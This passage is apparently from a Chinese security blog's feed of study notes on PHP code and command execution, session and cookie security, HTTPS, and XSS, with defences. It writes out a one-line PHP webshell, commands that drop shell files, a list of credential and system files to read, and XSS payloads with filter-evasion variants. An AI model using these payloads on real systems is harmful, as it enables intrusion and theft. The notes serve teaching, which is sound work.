assert()</h3><p>功能：同eval函数类似，也是将字符串当作PHP代码执行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808765.png"alt="image-20231110145700143" /><figcaption aria-hidden="true">image-20231110145700143</figcaption></figure><p>注意：eval函数与assert函数用法<strong>不同</strong>；eval是一个语言构造器，而不是一个函数，不能被可变函数调用；assert在php中被认为是一个函数，能被可变函数调用。</p><h3 id="preg_repalce">2.1.4 preg_repalce()</h3><p>功能：搜索subject中正则匹配pattern的部分，以replacement进行替换</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808766.png"alt="image-20231110145838364" /><figcaption aria-hidden="true">image-20231110145838364</figcaption></figure><p>pattern：要搜索的模式，可以是一个字符串或字符串数组。当pattern处存在一个“/e”修饰符时，$replacement的值会被当成php代码来执行。</p><h3 id="call_user_func">2.1.5 call_user_func()</h3><p>功能：回调函数，把第一个参数作为回调函数使用，其余参数都是回调函数的参数。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808767.png"alt="image-20231110150103346" /><figcaption aria-hidden="true">image-20231110150103346</figcaption></figure><h3 id="ab">2.1.6 <code>$a($b)</code></h3><p>功能：把第一个参数作为函数使用，其余参数都是函数的参数</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808768.png"alt="image-20231110150409269" /><figcaption aria-hidden="true">image-20231110150409269</figcaption></figure><h2 id="利用">2.2 利用</h2><ul><li><p>利用远程命令执行漏洞可以执行一句话木马，从而GetShell，借助WebShell工具连接一句话木马：<code>?a=@eval($_POST[cmd]);</code></p></li><li><p>利用PHP魔术常量获取信息：PHP向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__LINE__</span>       文件中的当前行号<br><span class="hljs-keyword">__FILE__</span>       文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名<br><span class="hljs-keyword">__DIR__</span>        文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录<br><span class="hljs-keyword">__FUNCTION__</span>   该常量所在的函数名称（PHP <span class="hljs-number">4.3</span>.<span class="hljs-number">0</span> 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的<br><span class="hljs-keyword">__CLASS__</span>      该类被定义时的名字（PHP <span class="hljs-number">4.3</span>.<span class="hljs-number">0</span> 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写）<br><span class="hljs-keyword">__TRAIT__</span>      Trait的名字（PHP <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span> 新加）。自PHP5.<span class="hljs-number">4.0</span>起，PHP实现了代码复用的一个方法，称为traits<br><span class="hljs-keyword">__METHOD__</span>     类的方法名（PHP <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span> 新加）。返回该方法被定义时的名字（区分大小写）<br><span class="hljs-keyword">__NAMESPACE__</span>  当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP <span class="hljs-number">5.3</span>.<span class="hljs-number">0</span> 新增）<br>实例：<br>?a=<span class="hljs-keyword">print</span>(<span class="hljs-keyword">__LINE__</span>)<br></code></pre></td></tr></table></figure></li><li><p>读取敏感文件：利用远程命令执行漏洞可以读取一些操作系统的敏感文件，从而获取重要信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">Windows<br>C:\boot.ini                                  <span class="hljs-regexp">//</span>查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml     <span class="hljs-regexp">//</span>IIS配置文件<br>C:\windows\repair\sam                       <span class="hljs-regexp">//</span>windows初次安装的密码<br>C:\program Files\mysql\my.ini               <span class="hljs-regexp">//</span>Mysql配置信息<br>C:\program Files\mysql\data\mysql\user.MYD  <span class="hljs-regexp">//</span>Mysql root C:\windows\php.ini  <br>Linux<br><span class="hljs-regexp">/etc/</span>passwd                                       <span class="hljs-regexp">//</span>linux用户信息<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/app/</span>apache2<span class="hljs-regexp">/conf/</span>httpd.conf            <span class="hljs-regexp">//</span>apache2配置文件<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/app/</span>php5<span class="hljs-regexp">/lib/</span>php.ini                   <span class="hljs-regexp">//</span>php配置文件<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf                       <span class="hljs-regexp">//</span>apache配置文件<br><span class="hljs-regexp">/etc/my</span>.cnf                                      <span class="hljs-regexp">//</span>Mysql配置文件<br>实例<br>?a=var_dump(file_get_contents(‘C:\Windows\win.ini’))<br></code></pre></td></tr></table></figure></li><li><p>利用远程命令执行漏洞可以执行写文件的代码，生成新的脚本文件（可以是一句话木马）：<code>?a=var_dump(file_put_contents($_POST[1],$_POST[2]);</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808769.png"alt="image-20231110150832067" /><figcaption aria-hidden="true">image-20231110150832067</figcaption></figure></li></ul><h1 id="系统os命令执行">3. 系统(OS)命令执行</h1><h2 id="相关函数-1">3.1 相关函数</h2><p>允许系统命令执行的函数：</p><ul><li><code>system()</code></li><li><code>exec()</code></li><li><code>shell_exec()</code></li><li><code>passthru()</code></li><li><code>popen()</code></li><li>反引号</li></ul><h3 id="system">3.1.1 system()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808770.png"alt="image-20231110151747584" /><figcaption aria-hidden="true">image-20231110151747584</figcaption></figure><h3 id="exec">3.1.2 exec()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808771.png"alt="image-20231110151903975" /><figcaption aria-hidden="true">image-20231110151903975</figcaption></figure><h3 id="shell_exec">3.1.3 shell_exec()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808772.png"alt="image-20231110152043829" /><figcaption aria-hidden="true">image-20231110152043829</figcaption></figure><h3 id="passthru">3.1.4 passthru()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808773.png"alt="image-20231110152205248" /><figcaption aria-hidden="true">image-20231110152205248</figcaption></figure><h3 id="popen">3.1.5 popen()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808774.png"alt="image-20231110152306936" /><figcaption aria-hidden="true">image-20231110152306936</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808775.png"alt="image-20231110174746222" /><figcaption aria-hidden="true">image-20231110174746222</figcaption></figure><h3 id="反引号">3.1.6 反引号</h3><p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP将尝试将反引号中的内容作为 shell命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数shell_exec() 相同。</p><h2 id="利用-1">3.2 利用</h2><ul><li>写脚本文件：<code>?a=echo “&lt;?php phpinfo();?&gt;” &gt; C:\server\apache22\htdocs\os\info.php</code>;<code>?a=echo “&lt;?php @eval($_POST[666]);?&gt;” &gt; C:\server\apache22\htdocs\os\shell.php</code></li><li>执行操作系统命令，获取重要信息，如查看文件：<code>?a=type c:\windows\system32\drivers\etc\hosts</code>;</li></ul><p>q:以下哪种方法不能执行命令（C）</p><p>A. <code>system(whoami);</code></p><p>B. <code>system('whoami');</code></p><p>C. <code>system('eval(whoami);');</code></p><p>D.<code>eval('system(whoami);');</code></p><h1 id="命令执行漏洞防御">4. 命令执行漏洞防御</h1><ul><li>尽量不要执行外部命令</li><li>使用自定义函数或函数库来替代外部命令的功能</li><li>使用<code>escapeshellarg</code>函数来处理命令参数，该函数会将任何引起参数或命令结束的字符转义</li><li>用<code>safe_mode_exec_dir</code>指定要执行程序的主目录，可以把会使用的命令提前放入此路径内</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/11/02/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/XSS/"/>
    <url>/2023/11/02/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="会话管理">1. 会话管理</h1><h2 id="web会话管理概述">1.1 Web会话管理概述</h2><p>HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。</p><h2 id="web会话管理方式">1.2 Web会话管理方式</h2><h3 id="基于server端session的管理的方式">1.2.1基于server端session的管理的方式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731090.png"alt="image-20231109103852913" /><figcaption aria-hidden="true">image-20231109103852913</figcaption></figure><p><strong>优点：</strong></p><ul><li>某些地方使用可以简化Web开发:如果在诸多Web页面间传递一个变量，那么用Session变量要比通过QueryString传递变量可使问题简化。</li><li>安全性好:客户端与服务端保持会话状态的媒介始终只是一个sessionID串，只要这个串够随机，攻击者就不能轻易冒充他人的sessionID进行操作;除非通过CSRF或http劫持的方式，才有可能冒充别人进行操作;即使冒充成功，也必须被冒充的用户session里面包含有效的登录凭证才行。</li></ul><p><strong>缺点：</strong></p><ul><li>这种方式将会话信息存储在Web服务器里面，当用户同时在线量比较多时，这些会话信息会占据比较多的内存。</li><li>当应用采用集群部署的时候，会遇到多台web服务器之间如何做session共享的问题。</li><li>多个应用要共享session时，还会遇到跨域问题。不同的应用可能部署的主机不一样，需要在各个应用做好cookie跨域的处理。</li></ul><h3 id="cookie-based的管理方式">1.2.2 cookie-based的管理方式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731091.png"alt="image-20231109104425691" /><figcaption aria-hidden="true">image-20231109104425691</figcaption></figure><p>Cookie和Session最大区别：</p><ul><li>Cookie将数据存储在客户端</li><li>Session将数据存储在服务端</li></ul><p><strong>优点：</strong></p><ul><li>实现了服务端的无状态化(最大的优点），服务端只需要负责创建和验证登录cookie即可，无需保持用户的状态信息。</li><li>cookie可以跨越同域名下的的多个网页，但不能跨越多个域名使用</li><li>可以设置有效期限，控制cookie的生命周期，使之不会永远有效(攻击者可能拿到的是过期的cookie）</li></ul><p><strong>缺点：</strong></p><ul><li>cookie有大小限制，存储不了太多数据。</li><li>每次传送cookie，增加了请求的数量，对访问性能也有影响。</li><li>同样存在跨域问题(不同域名无法互相读取cookie）</li></ul><h3 id="token-based的管理方式">1.2.3 token-based的管理方式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731093.png"alt="image-20231109104742456" /><figcaption aria-hidden="true">image-20231109104742456</figcaption></figure><p><strong>优点：</strong></p><ul><li><strong>支持跨域访问</strong>:Cookie是不支持跨域访问的，Token支持</li><li>无状态:Token无状态，Session有状态(有状态和无状态最大的区别就是服务端会不会保存客户端的信息）</li><li>支持移动设备:Token更适用于移动应用，Cookie不支持手机端访问</li></ul><p><strong>缺点：</strong></p><ul><li>占带宽:正常情况下Token要比sessionID更大，需要消耗更多的流量，挤占更多带宽</li><li>无法在服务端注销，很难解决劫持问题</li></ul><h2 id="web会话管理安全问题">1.3 Web会话管理安全问题</h2><ul><li>三种会话管理方式的凭证本身是比较安全的</li><li>采用HTTPS提高安全性</li></ul><h1 id="session攻击">2. Session攻击</h1><h2 id="session攻击简介">2.1 session攻击简介</h2><ul><li>预测</li><li>捕获(劫持)</li><li>固定</li></ul><h2 id="会话预测">2.2 会话预测</h2><p>会话预测这种方式需要攻击者猜测出系统中使用的有效的Ssession标识符（PHP中格式为PHPSESSID=1234），类似暴力破解。目前会话预测这种攻击方式基本上不太可能成功。</p><h2 id="会话劫持">2.3 会话劫持</h2><p><strong>攻击流程：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731094.png"alt="image-20231109110520149" /><figcaption aria-hidden="true">image-20231109110520149</figcaption></figure><p><strong>获取Session ID：</strong></p><ul><li>暴力破解:尝试各种Session ID，直到破解为止</li><li>预测:如果SessionID使用非随机的方式产生，那么就有可能计算出来</li><li>窃取:使用网络嗅探、XSS攻击等方法获得</li></ul><p><strong>防御方法：</strong></p><ul><li>更改Session名称</li><li>关闭透明化Session ID:透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，SessionID则使用URL来传递。</li><li>设置HttpOnly</li><li>验证HTTP头部信息</li></ul><p><strong>中间人攻击：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731095.png"alt="image-20231109111139852" /><figcaption aria-hidden="true">image-20231109111139852</figcaption></figure><ul><li>中间人攻击(Man-in-the-MiddleAtack，简称“MITM攻击”）是—种通过窃取或篡改通信物理、逻辑链路间接完成攻击行为的网络攻击方法。攻击者与通信的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，实际上整个会话都被攻击者完全控制。这个被攻击者控制的通信节点就是所谓的“中间人“。</li><li>常见类型：<ul><li>基于监听的信息窃取</li><li>基于监听的身份冒认</li></ul></li></ul><h2 id="会话固定">2.4 会话固定</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731096.png"alt="image-20231109111413841" /><figcaption aria-hidden="true">image-20231109111413841</figcaption></figure><ul><li>会话固定也可以看成是会话劫持的一种类型，因为会话固定攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</li><li>重置Session ID的方式：<ul><li>使用客户端脚本来设置Cookie到浏览器</li><li>使用HTML的<code>&lt;META&gt;</code>标签加Set-Cookie属性.与客户端脚本相比，对META&gt;标签的处理目前还不能被浏览器禁止.</li><li>使用Set-Cookie的HTTP响应头部设置Cookie</li></ul></li><li>防御方法：<ul><li>每当用户登陆的时候就进行重置Session ID</li><li>Session ID闲置过久时，进行重置Session ID</li><li>大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化SessionID，User-Agent验证，Token校验等。</li></ul></li></ul><h1 id="cookie安全">3. Cookie安全</h1><h2 id="cookie机制">3.1 Cookie机制</h2><p><strong>Cookie重要字段：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731097.png"alt="image-20231109112543427" /><figcaption aria-hidden="true">image-20231109112543427</figcaption></figure><p><strong>子域Cookie机制：</strong></p><p>Domain字段，设置cookie时，如果不指定则默认是本域。</p><p><strong>路径Cookie机制：</strong>path字段，设置cookie时，如不指定则默认是当前页面路径。</p><p><strong>HttpOnly Cookie机制：</strong></p><p>用于告诉浏览器不要向客户端脚本暴露Cookie。指仅在HTTP层面上传输Cookie，当设置了HttpOnly属性后，客户端脚本就无法读写该Cookie，能<strong>有效的防御XSS攻击</strong>获取Cookie。</p><p><strong>Secure Cookie机制：</strong></p><p>SecureCookie机制指的是设置了Secure标志的Cookie仅在HTTPS层面上安全传输，如果请求是HTTP的就不会带上这个Cookie，这样能降低重要的Cookie被中间人截获的风险。</p><h2 id="cookie存储">3.2 Cookie存储</h2><p><strong>本地Cookie与内存Cookie：</strong></p><p>如果没设置过期时间，则是内存Cookie，这样的Cookie会随着浏览器关闭而从内存中消失;如果设置了过期时间，那么就是本地Cookie，这样的Cookie就会以文本形式保存在操作系统本地，待过期时间到了才会消失。</p><p><strong>安全性：</strong></p><p>不存在谁的安全性更高</p><h1 id="http协议安全">4. HTTP协议安全</h1><h2 id="weak-session-ids">4.1 Weak Session IDs</h2><ul><li>Session利用的实质:由于SessionlD是用户登录之后持有的唯—认证凭证，因此黑客不需要再攻击登陆过程(比如密码)，就可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而查找其他漏洞如XSS、文件上传等等。</li><li>弱会话ID：容易被攻击者预测</li></ul><h2 id="http协议安全问题">4.2 HTTP协议安全问题</h2><ul><li>通讯使用明文，未加密，并且TCP/IP协议是可能会被窃听的网络，所以通讯内容可能会被窃听</li><li>没有验证通讯方的身份，可能会被冒充</li><li>没有办法验证报文的完整性，可能会被篡改</li></ul><h2 id="https协议">4.3 HTTPS协议</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731098.png"alt="image-20231109140248365" /><figcaption aria-hidden="true">image-20231109140248365</figcaption></figure><p><strong>SSL/TLS协议：</strong> -所有的信息都是加密传输，第三方无法窃听 - 配备身份证书，防止被冒充 -具有校验机制，一旦被篡改，通信双方立马发现</p><p><strong>HTTPS协议：</strong></p><p>超文本传输安全协议(HyperText TransferProtocolSecure，缩写HTTPS;常称为HTTP over TLS、HTTP over SSL或HTTPSecure），是一种通过计算机网络进行安全通信的传输协议，简单来说是HTTP的安全版。</p><p><strong>SSL协议组成：</strong> - 记录协议（RecordProtocol）：为高层协议提供基本的安全服务。 - 握手协议(HandshakeProtocol)：协调客户和服务器的状态，使双方能够达到状态的同步 -警告协议(Alert Protocol) - 密码规范改变协议（Change Cipher Protocol)</p><p><strong>HTTPS通信过程：</strong> <imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731099.png"alt="image-20231109140631323" /></p><p><strong>HTTPS缺点：</strong> -对数据进行加解密决定了HTTPS比HTTP慢，相同网络环境下，使用HTTPS协议会使页面的加载时间延长近50%，增加10%-20%的耗电-HTTPS协议的安全是有范围的，在黑客攻击、拒绝服务攻击、服务器劫持几乎起不到什么作用-SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行- SSL证书需要购买，功能越强大的证书费用越高。小网站可选择入门级免费证 -SSL证书通常需要绑定IP，为服务器增加固定IP会增加一定费用 -HTTPS连接服务器端资源占用高很多，支持访客稍多的网站需要投入更大的成本 -HTTPS连接缓存不如HTTP高效，流量成本太高</p><h1 id="xss跨站脚本攻击">5. XSS跨站脚本攻击</h1><h2 id="xss漏洞概述">5.1 XSS漏洞概述</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731100.png"alt="image-20231109141424937" /><figcaption aria-hidden="true">image-20231109141424937</figcaption></figure><ul><li><p>XSS被称为跨站脚本攻击（CrosS-sitescripting），由于和CSS（Cascading StyleSheets）重名，所以改为XSS。</p></li><li><p>XSS主要基于javascript语言完成恶意的攻击行为，因为javascript可以非常灵活的操作html、css和浏览器。</p></li><li><p>XSS攻击的对象是用户浏览器，属于<strong>被动攻击</strong>。</p></li><li><p>实施XSS攻击需要具备的两个条件:</p><ul><li>需要向Web页面注入精心构造的恶意代码</li><li>对用户的输入<strong>没有做过滤</strong>，恶意代码能够被浏览器成功的执行</li></ul></li><li><p>XSS验证（弹窗）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"># 构造弹窗的代码提交，浏览器在执行该代码后就会执行弹框的操作，弹框的目的是验证提交的JS代码是否被执行，从而验证XSS漏洞是否存在。<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;你的电脑中病毒了&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;你的电脑中病毒了&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;你的电脑中病毒了&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="xss漏洞分类">5.2 XSS漏洞分类</h2><h3 id="反射型xss">5.2.1 反射型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731101.png"alt="image-20231109142051057" /><figcaption aria-hidden="true">image-20231109142051057</figcaption></figure><ul><li>反射型XSS又称为非持久型XSS，是现在最容易出现的一种XSS漏洞。用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。</li><li>特点：<ul><li><strong>非持久性</strong></li><li>参数型脚本</li><li>反射型XSS的JS代码在Web应用的参数(变量）中，如搜索框等地方</li></ul></li><li>数据流量走向:浏览器-&gt; 后端-&gt;浏览器</li><li>实际利用中可结合短网址</li></ul><h3 id="存储型xss">5.2.2 存储型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731102.png"alt="image-20231109142349933" /><figcaption aria-hidden="true">image-20231109142349933</figcaption></figure><ul><li>存储型XSS又叫持久型XSS。一般而言，它是三种XSS里危害最大的一种。此类型的XSS漏洞是由于恶意攻击代码被持久化保存到服务器上，然后被显示到HTML页面之中。这类漏洞经常出现在用户评论的页面，攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</li><li>特点:<ul><li><strong>持久性</strong></li><li>持久性体现在JS代码不是在某个参数(变量）中，而是写进数据库或文件等可以永久保存数据的介质中，如留言板等地方</li></ul></li><li>数据流量走向:浏览器-&gt; 后端-&gt;数据库-&gt;后端-&gt;浏览器</li></ul><h3 id="dom型xss">5.2.3 DOM型XSS</h3><ul><li><p>DOM树</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731103.png"alt="image-20231109142624025" /><figcaption aria-hidden="true">image-20231109142624025</figcaption></figure></li><li><p>文档是由节点构成的集合，在DOM里存在许多不同类型的节点，主要分为以下三种:</p><ul><li>元素节点：<code>&lt;body&gt;</code>、<code>&lt;p&gt;</code></li><li>文本节点</li><li>属性节点</li></ul></li><li><p>D0M型XSS漏洞是基于文档对象模型（Document ObjectModel)的一种漏洞。这种XSS与反射型XSS、持久型XSS在原理上有本质区别，<strong>它的攻击代码并不需要服务器解析响应，触发XSS靠的是浏览器端的DOM解析</strong>。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如<code>document.qetElementByld("×").innerHTML</code>、<code>document.write</code>等。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731104.png"alt="image-20231109143118310" /><figcaption aria-hidden="true">image-20231109143118310</figcaption></figure></li><li><p>特点：<strong>非持久性</strong></p></li><li><p>数据流量走向：URL -&gt; 浏览器</p></li></ul><h2 id="xss-payload构造以及变形">5.3 XSS payload构造以及变形</h2><h3 id="构造">5.3.1 构造</h3><ul><li>利用<code>&lt;&gt;</code>构造HTML标签和<code>&lt;script&gt;&lt;/Script&gt;</code>标签</li><li>利用HTML标签的属性值(伪协议）<code>&lt;a href="javascript:alert(/xss/)"&gt;touch me!&lt;/a&gt;</code></li><li>利用事件<ul><li>windows事件：对windows 对象触发的事件</li><li>Form 事件：HTML 表单内的动作触发事件</li><li>Keyboard 事件：键盘按键</li><li>Mouse 事件：由鼠标或类似用户动作触发的事件</li><li>Media 事件：由多媒体触发的事件</li><li><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></li></ul></li><li>利用CSS（基本不适合现在主流浏览器）</li></ul><h3 id="变形">5.3.2 变形</h3><p>Web网站在对用户输入进行过滤，但是过滤不严格时，可以构造各种不同的Payload以及对XSS的Payload进行变形，使其绕过过滤机制，使网站弹框，从而挖掘XSS漏洞。</p><ul><li>大小写</li><li>双写关键字<code>&lt;scrscriptipt&gt;alert(xss)&lt;/scrscriptipt&gt;</code></li><li>引号：如果在HTML标签中，可以不用引号；如果在js中，可以用反引号代替单双引号<code>&lt;img src="#" onerror="alert(/xss/)"/&gt;</code></li><li><code>/</code>代替空格</li><li>Tab与回车：在一些位置添加Tab（水平制表符）和回车符来绕过关键字检测</li><li>编码：HTML实体编码、URL编码</li></ul><h1 id="cookie攻击">6. Cookie攻击</h1><h2 id="cookie基础">6.1 Cookie基础</h2><ul><li>Cookie 是用户浏览网页时网站存储在用户机器上的小文本文件。</li><li>主要记录与用户相关的一些状态或者设置，比如用户名、ID、访问次数等。当用户下一次访问这个网站的时候，网站会先访问用户机器上对应的该网站的Cookie文件。</li><li>作用：<ul><li>Cookie最大作用维持会话的凭证</li><li>减少登录网站的次数</li><li>记录关于用户信息</li></ul></li><li>类型：<ul><li>持久型Cookie以文本形式存储在硬盘上，由浏览器存取</li><li>临时型Cookie也称为会话Cookie，存储在内存中，关闭当前浏览器后会立即消失</li></ul></li><li>浏览器通过Document对象访问Cookie</li></ul><h2 id="cookie攻击-1">6.2 Cookie攻击</h2><p><strong>类型：</strong></p><ul><li>直接访问Cookie文件查找想要的机密信息;</li><li>在客户端和服务端进行Cookie信息传递的时候进行窃取，从而冒充合法用户操作;</li><li>攻击者修改Cookie信息，所以在服务端接收到客户端获取的Cookie信息的时候，就会对攻击者伪造过的Cookie信息操作。</li></ul><p><strong>获取Cookie信息的主要途径：</strong> -直接读取磁盘的Cookie文件; - 使用网络嗅探器来获取网络上传输的Cookie; -使用Cookie管理工具获取内存或文件系统中的Cookie; -使用跨站脚本盗取Cookie。</p><p><strong>相关函数：</strong></p><ul><li><code>fopen("cookie.txt,"a")</code>：以写入方式打开cookie.txt</li><li><code>fwrite($log, $cookie."\n")</code>：将<code>$cookie</code>变量的内容写入文件指针<code>$log</code>处</li><li><code>fclose($log)</code>：关闭已经打开的<code>$log</code>指针</li></ul><h2 id="xss钓鱼攻击">6.3 XSS钓鱼攻击</h2><ul><li>XSS重定向钓鱼(XSS RedirectPhishing)：将正常用户访问重定向到恶意网站，将恶意网站伪造的和正常访问的网站一样。</li><li>HTML注入式钓鱼(XSS HTML lnjectPhishing）：HTML注入式钓鱼是指直接利用XSS漏洞注入HTML或JavaScript代码到页面中。</li><li>iframe钓鱼：iframe钓鱼是通过标签嵌入远程域的一个页面实施钓鱼。</li><li>高级钓鱼技术：注入代码劫持HTML表单、使用JavaScript编写键盘记录器等。</li></ul><h1 id="xss-worm">7. XSS Worm</h1><h2 id="介绍">7.1 介绍</h2><ul><li><p>所谓的跨站脚本蠕虫(XSSWorm），实质上是一段<strong>脚本程序</strong>，通常用JavaScript或Vbscript写成，在用户浏览XSS页面时被激活。蠕虫利用站点页面的XSS漏洞根据其特定规则进行传播和感染。</p></li><li><p>攻击流程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731105.png"alt="image-20231109150444650" /><figcaption aria-hidden="true">image-20231109150444650</figcaption></figure></li></ul><h2 id="剖析">7.2 剖析</h2><ul><li>寻找XSS点</li><li>实现蠕虫行为</li><li>收集蠕虫数据</li><li>传播与感染</li></ul><p><strong>DOM技术：</strong></p><ul><li>访问元素<ul><li><code>document.getElementByld(“div1”)</code></li><li><code>document.getElementByname</code></li><li><code>document.getElementByTagName</code></li></ul></li><li>所有的DOM元素无外乎分为两种:<strong>文本和元素</strong>。使用<code>innerHTML</code>属性就可以从一个元素中提取所有的HTML和文本。</li><li><code>innerHTML</code>方法还可以向HTML DOM中插入新内容</li></ul><h1 id="xss攻击防御">8. XSS攻击防御</h1><h2 id="xss-filter">8.1 XSS Filter</h2><p>XSSFilter的作用是通过<strong>正则</strong>的方式对用户(客户端）请求的参数做脚本的过滤，从而达到防范XSS攻击的效果。</p><h2 id="过滤方法">8.2 过滤方法</h2><ul><li><p><strong>输入验证</strong>：输入验证是对输入数据使用强类型检查，验证数据的类型、长度、格式、范围等。</p></li><li><p><strong>数据净化</strong>：数据净化是为了使有潜在危害的数据变得安全。如果所允许的输入范围不能保证输入数据的安全性，数据净化就非常有用。<strong>数据净化包括从删除用户输入字符串后面的空格到去除值等一切行为。</strong>在Web 应用程序中，常见的数据净化示例是<strong>使用 URL 